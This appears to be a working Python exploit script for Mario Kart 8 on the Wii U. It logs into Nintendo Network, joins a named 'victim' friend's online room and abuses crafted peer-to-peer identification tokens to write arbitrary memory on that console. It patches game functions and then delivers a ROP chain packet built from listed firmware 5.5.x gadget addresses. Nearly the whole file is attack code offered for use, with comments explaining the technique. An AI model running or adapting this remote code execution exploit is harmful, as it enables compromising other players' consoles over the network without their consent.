from nintendo.nex import backend, authentication, matchmaking
from nintendo.pia.station import IdentificationInfo
from nintendo.pia.session import PIASession
from nintendo.account import AccountAPI
from nintendo.games import MK8
import struct
import time


# 80 61 00 08 80 81 00 0C 80 01 00 14 7C 08 03 A6 38 21 00 10 4E 80 00 20
# 80 A1 00 08 38 21 00 10 7C A3 2B 78 80 81 00 04 7C 88 03 A6 4E 80 00 20

# 80 C1 00 14 90 61 00 10 80 01 00 10 91 5E 00 2C 81 21 00 08 90 1E 00 30 91 3E 00 28 90 DE 00 34 80 01 00 34 83 E1 00 2C 7C 08 03 A6 83 C1 00 28 38 21 00 30 4E 80 00 20
# 80 1F 00 00 7C 09 03 A6 4E 80 04 21 83 FF 00 04 2C 1F 00 00 40 82 FF EC 80 01 00 14 83 E1 00 0C 7C 08 03 A6 38 21 00 10 4E 80 00 20
# 0x02000850 = pop r30, r31
# 0x02A5D698 = pop r3, r4, r26

ROP_POPJUMPLR_STACK12 = 0x0101CD24
ROP_POPJUMPLR_STACK20 = 0x01024D88
ROP_CALLFUNC = 0x01080274
ROP_CALLR28_POP_R28_TO_R31 = 0x0107DD70
ROP_POP_R28R29R30R31 = 0x0101D8D4
ROP_POP_R27 = 0x0101CB00
ROP_POP_R24_TO_R31 = 0x010204C8
ROP_CALLFUNCPTR_WITHARGS_FROM_R3MEM = 0x010253C0
ROP_SETR3TOR31_POP_R31 = 0x0101CC10
ROP_Register = 0x010277B8
ROP_CopyToSaveArea = 0x010277DC
ROP_memcpy = 0x01035FC8
ROP_DCFlushRange = 0x01023F88
ROP_ICInvalidateRange = 0x010240B0
ROP_OSSwitchSecCodeGenMode = 0x010376C0
ROP_OSCodegenCopy = 0x010376D8
ROP_OSGetCodegenVirtAddrRange = 0x010375C0
ROP_OSGetCoreId = 0x01024E8C
ROP_OSGetCurrentThread = 0x01043150
ROP_OSSetThreadAffinity = 0x010429DC
ROP_OSYieldThread = 0x010418E4
ROP_OSFatal = 0x01031618
ROP_Exit = 0x0101CD80
ROP_OSScreenFlipBuffersEx = 0x0103AFD0
ROP_OSScreenClearBufferEx = 0x0103B090
ROP_OSDynLoad_Acquire = 0x0102A3B4
ROP_OSDynLoad_FindExport = 0x0102B828
ROP_os_snprintf = 0x0102F160
ROP_GX2Init = 0x01156B78
ROP_GX2Flush = 0x011575AC
ROP_GX2Shutdown = 0x020086CC - 0xeb1390
ROP_GX2DirectCallDisplayList = 0x01152BF0

ROP_Restart = 0x02019A80 - 0xFE3C00

ROP_OSDriver_Register = 0x010277B8
ROP_OSDriver_Deregister = 0x010277C4
ROP_OSDriver_CopyFromSaveArea = 0x010277D0
ROP_OSDriver_CopyToSaveArea = 0x010277DC


# coreinit init 0x0200890C = pop r5

#0x04		rop2[0x164/4] = r6load_addr;
#0x08		rop2[0x168/4] = 0; # r9 ici
#0x0C		rop2[0x16c/4] = 0;
#0x10		rop2[0x170/4] = 0; # r3 stocker ici | r0 = r3
#0x14		rop2[0x174/4] = 4; # r6
#0x18		rop2[0x178/4] = 0;
#0x1C		rop2[0x17C/4] = 0;
#0x20		rop2[0x180/4] = 0;
#0x24		rop2[0x184/4] = 0;
#0x28		rop2[0x188/4] = 0;
#0x2C		rop2[0x18c/4] = stack2 + 0x1c0; # r31 -> ptr to function
#0x30		rop2[0x190/4] = 0;
#0x04		rop2[0x194/4] = sigwait_addr; # lr


#hex(0x02000020 + (0xa5dde4 - 0x76C))
#hex(0x02000000 + (0x8C10 - 0x304))


def _byteswap_long(i):
    return struct.unpack("<I", struct.pack(">I", i))[0]


# A packet may contain more than 1000 bytes,
# enough room to build a nice ROP chain
rop_payload = [
	0,
	0, 
	0,
	0,
	0,
	0,
	0,
	0,
	0,

]

def ropgen_setr3(r3=0, r4=0):
	rop_payload.append(0x0110C904)
	rop_payload.append(r3)
	rop_payload.append(r4) # r4
	rop_payload.append(r4)

def tiny_call(fptr, r3=0, r4=0):
	ropgen_setr3(r3, r4)
	rop_payload.append(ROP_POP_R28R29R30R31)
	rop_payload.append(fptr)
	rop_payload.append(0)
	rop_payload.append(0)
	rop_payload.append(r4)
	rop_payload.append(0)
	rop_payload.append(ROP_CALLR28_POP_R28_TO_R31)
	rop_payload.append(0)
	rop_payload.append(0)
	rop_payload.append(0)
	rop_payload.append(0)
	rop_payload.append(0)

def call_noargs(fptr):
	rop_payload.append(ROP_POP_R28R29R30R31)
	rop_payload.append(fptr)
	rop_payload.append(0)
	rop_payload.append(0)
	rop_payload.append(0)
	rop_payload.append(0)
	rop_payload.append(ROP_CALLR28_POP_R28_TO_R31)
	rop_payload.append(0)
	rop_payload.append(0)
	rop_payload.append(0)
	rop_payload.append(0)
	rop_payload.append(0)

def ropgen_write_r3r4_tomem(outaddr):

	rop_payload.append(ROP_POP_R28R29R30R31)
	rop_payload.append(ROP_OSGetCodegenVirtAddrRange + 0x20)
	rop_payload.append(0)
	rop_payload.append(outaddr)
	rop_payload.append(0x10000000)
	rop_payload.append(0)
	rop_payload.append(ROP_CALLR28_POP_R28_TO_R31)
	rop_payload.append(0)
	rop_payload.append(0)
	rop_payload.append(0)

def write32(addr, value):

	ropgen_setr3(value)
	ropgen_write_r3r4_tomem(addr)

def make_pm4_type3_packet_header(opcode, count):

	hdr = 0
	hdr |= (3 << 30)
	hdr |= ((count-1) << 16)
	hdr |= (opcode << 8)		

	return hdr

def pop_r24_to_r31(inputregs):

	rop_payload.append(ROP_POP_R24_TO_R31)
	rop_payload.append(0)
	rop_payload.append(0)

	for i in range(0, 8):
		rop_payload.append(inputregs[i])

	rop_payload.append(0)

def call_func(funcaddr, r3=0, r4=0, r5=0, r6=0, r28=0):

	input_regs = 	[r6,
					r5,
					0,
					ROP_CALLR28_POP_R28_TO_R31,
					funcaddr,
					r3,
					0,
					r4]

	pop_r24_to_r31(input_regs)

	rop_payload.append(ROP_CALLFUNC)
	rop_payload.append(r28)
	rop_payload.append(0)
	rop_payload.append(0)
	rop_payload.append(0)
	rop_payload.append(0)


def calc_addr(idx):
	return (0x387D36AC + ((idx - 9) *4))

def sysapp_to_realaddr(addr):
	return addr + (0x0EED81C0 - 0x02000000)

def doBL(dst, src):
	newval = (dst - src)
	newval &= 0x03FFFFFC
	newval |= 0x48000001
	return newval

def userspace_to_kheap_index(addr):
  return (0x10000000 + ((addr - 0xFF200014)//16))


# ROP CHAIN -------------------------------------------------------------------

#
# you can use all of the function above
# even GX2 ones and OSDriver syscalls
# 5.5.x address
# 
# this example rop chain will write data to memory
# register an OSDriver
# OSFatal with a modified string
#
# write32 is very memory intensive
# rather append it to the rop chain and calculate the addr
#
# call_func is also memory intensive
# use tiny_call for <= 2 argument functions
#

driver_name_idx = 195
pm4_packet_idx = 198

# fake heap block
write32(0x1F200014, 0x105F0000)
write32(0x1F200018, 0xFFFFFFB4)
write32(0x1F20001C, 0xFFFFFFFF)
write32(0x1F200020, 0xFFFFFFFF)

tiny_call(ROP_DCFlushRange, 0x1F200014, 32)

# send the PM4 packet & flush
tiny_call(ROP_DCFlushRange, calc_addr(-9), 0x400)
tiny_call(ROP_GX2DirectCallDisplayList, calc_addr(pm4_packet_idx), 32)
tiny_call(ROP_GX2Flush)

# register our osdriver (allocation will be in userspace)
call_func(ROP_OSDriver_Register, calc_addr(driver_name_idx), 6, 0, 0)

# change driver save area and copy driver name to it
write32(0x105F0000 + 0x44, 0x10000000)
call_func(ROP_OSDriver_CopyToSaveArea, calc_addr(driver_name_idx), 6, calc_addr(driver_name_idx), 8)

# crash the console with the new string copied to the userland save area
tiny_call(ROP_OSFatal, 0x10000000) 

# DRVHAX\0\0
rop_payload.append(0x44525648)
rop_payload.append(0x41580000)

# padding
rop_payload.append(0)

# PM4 packet (needs to be aligned at 0x10 (or 0x20))
rop_payload.append(make_pm4_type3_packet_header(0x3D, 4))
rop_payload.append(0x1B800008)
rop_payload.append((1 << 18) | (0 << 17) | (0 << 16) | 0)
rop_payload.append(_byteswap_long(0x02000000))
rop_payload.append(0)
rop_payload.append(0x80000000)
rop_payload.append(0x80000000)
rop_payload.append(0x80000000)

# end of ROP CHAIN -------------------------------------------------------------------

for i in range(len(rop_payload)):
	print("%3d: %08X" %(i,rop_payload[i]))

print(hex(calc_addr(pm4_packet_idx)))

input()


# padding for the 1024 bytes

for i in range(256 - len(rop_payload)):
	if i >= 0:
		rop_payload.append(0xDEADC0DE)





# This is to get the index if you want to store data at the end of the rop chain
# 
# e.g: "214: 41ADEF48"
#
# and you need the pointer of this value for whatever reason
# you stop the program and
#
# calc_addr(214) will return the ptr of your value
# this can be used to store strings or PM4 packets ;)
# then call "osfatal" or "gx2directcalldisplaylist" with the ptr
#






# real code

#Device id can be retrieved with a call to MCP_GetDeviceId(int mcp_fd, uint32_t *out_device_id) on the Wii U
#Serial number can be found on the back of the Wii U
DEVICE_ID = 0x00000000
SERIAL_NUMBER = "ABC123456789"
SYSTEM_VERSION = 0x220
REGION = 4 #EUR
COUNTRY = "FR"

USERNAME = "" #Nintendo network id
PASSWORD = "" #Nintendo network password

FRIEND_NAME = "" # victim nintendo network id (both cannot be the same, otherwise you'll get kicked once the python client connects)

# Log in on account server
api = AccountAPI()
api.set_device(DEVICE_ID, SERIAL_NUMBER, SYSTEM_VERSION, REGION, COUNTRY)
api.set_title(MK8.TITLE_ID_EUR, MK8.LATEST_VERSION)
api.login(USERNAME, PASSWORD)

my_pid = api.get_pid(USERNAME)
friend_pid = api.get_pid(FRIEND_NAME)

mii_name = api.get_mii(my_pid).name

# Connect to game server
nex_token = api.get_nex_token(MK8.GAME_SERVER_ID)
backend = backend.BackEndClient(MK8.ACCESS_KEY, MK8.NEX_VERSION)
backend.connect(nex_token.host, nex_token.port)
backend.login(
	nex_token.username, nex_token.password,
	authentication.AuthenticationInfo(nex_token.token, MK8.SERVER_VERSION)
)

matchmake_ext = matchmaking.MatchmakeExtensionClient(backend)

# Find friend room
playing_sessions = matchmake_ext.get_playing_session([friend_pid])
if not playing_sessions:
	raise RuntimeError("Couldn't find friend room for %s" %FRIEND_NAME)

gathering = playing_sessions[0].gathering

# Request session key (for p2p)
session_key = matchmake_ext.join_matchmake_session(
	gathering.id, "This is NintendoClients"
)


matchmaker = matchmaking.MatchMakingClient(backend)
session_urls = matchmaker.get_session_urls(gathering.id)

# Constructs an indentification token that writes
# an arbitrary value at an arbitrary address
def write(addr, value):
	func = 0xE8A26D4
	dummy = 0xAAAAAAAA
	strbuf = 0x386043D8
	vtable = 0x386042D4
	return struct.pack(
		">IIIIIIII", addr - 0xC, func, dummy,
		dummy, strbuf, vtable, dummy, value
	)


# The ability to write an arbitrary value at an arbitrary address is
# a powerful tool. It's easy to patch a virtual function for example:
# you simply need to overwrite its function pointer in its vtable.
# I'll briefly explain how this exploit turns this into a ROP chain.
#
# Md5Context::GetHashSize is called when the console checks the signature
# of an incoming packet, and when it appends a signature to an outgoing
# packet. Although GetHashSize doesn't take any parameters, r4 always
# contains the content of the packet when it is called, and r5 contains
# the size of the packet. This exploit redirects Md5Context::GetHashSize
# to the following piece of code:
#     ...
#     addi r3, r1, 8
#     bl memcpy
#     ...
# The next packet we send to the console after patching Md5Context::GetHashSize
# will be copied onto the stack, and the ROP chain starts as soon as
# Md5Context::GetHashSize returns.
#
# There are two issues with this approach:
#    - The console may try to send a packet before it receives our ROP packet
#    - The console might receive a packet from someone else before it receives
#      our ROP packet
# Both cases cause a normal packet to be copied onto the stack and crash
# the console. This exploit works around the first issue by patching
# StationPacketHandler::AssignPacket to always return 0. This stops the
# console from trying to send any packets. The second issue is the reason
# that this exploit only works when there are no other players in the
# friend room.

injections = [
	(0x1066f9b8, 0xEBC0314), #StationPacketHandler::AssignPacket -> return 0
	(0x1066889c, 0xEBE6624)  #Md5Context::GetHashSize -> memcpy on stack
]
	
# Create a packet with a valid header but whose body contains a ROP chain
rop_packet = b"\x32\xAB\x98\x64\x01\x00\x00\x00"
rop_packet += struct.pack(">%iI" %len(rop_payload), *rop_payload)

# Initialize P2P session
session = PIASession(backend, session_key)
session.start(
	write(*injections[0]), #Identification token that performs the first injection
	mii_name
)

# Because we won't receive any packets from the console after patching
# StationPacketHandler::AssignPacket, we need to guess what the console
# expects.

# Send a packet that 'expects' an acknowlegement
# but don't wait for the acknowlegement
def send_with_ack(station, message):
	ack_id = next(session.resending_transport.ack_id) & 0xFFFFFFFF
	message.payload += struct.pack(">I", ack_id)
	session.transport.send(station, message)

# Connect to session host
host = session.connect_to_host(session_urls)
session.resending_transport.send = send_with_ack
session.mesh_protocol.send_join_request(host) #First injection
time.sleep(1) #Wait for join response

# Replace identification token for second memory injection
session.station.identification_info = \
	IdentificationInfo(write(*injections[1]), mii_name)

# From now on we won't receive any packets from the console so
# we have to do things manually.

# Disconnect and reconnect to host
session.station_protocol.send_disconnection_request(host)
session.station_protocol.send_connection_request(host)
time.sleep(0.1)
ack_id = next(session.resending_transport.ack_id) & 0xFFFFFFFF
session.station_protocol.send_ack(host, struct.pack(">I", ack_id))
session.station_protocol.send_connection_response(host)
time.sleep(0.1)
ack_id = next(session.resending_transport.ack_id) & 0xFFFFFFFF
session.station_protocol.send_ack(host, struct.pack(">I", ack_id))
time.sleep(1)

# Send join request, performing the second memory injection
session.mesh_protocol.send_join_request(host)
time.sleep(1)

# Finally, send packet with ROP chain
session.transport.transport.socket.send(rop_packet, host.address)

# Disconnect from game server
backend.close()